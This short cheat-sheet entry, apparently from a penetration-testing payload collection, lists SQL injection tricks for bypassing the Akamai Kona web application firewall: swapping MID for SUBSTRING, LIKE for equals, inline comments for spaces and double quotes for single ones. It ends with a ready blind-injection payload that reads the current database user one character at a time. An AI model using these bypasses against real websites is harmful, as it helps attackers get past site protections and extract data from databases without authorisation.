## SQLI

**Akamai Kona Bypass**

* `MID` instead of `SUBSTRING`
* `LIKE` instead of `=`
* `/**/` instead of a `space`
* `CURRENT_USER` instead of `CURRENT_USER()`
* ` "` instead of `'`

Final example: 

```sql
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
```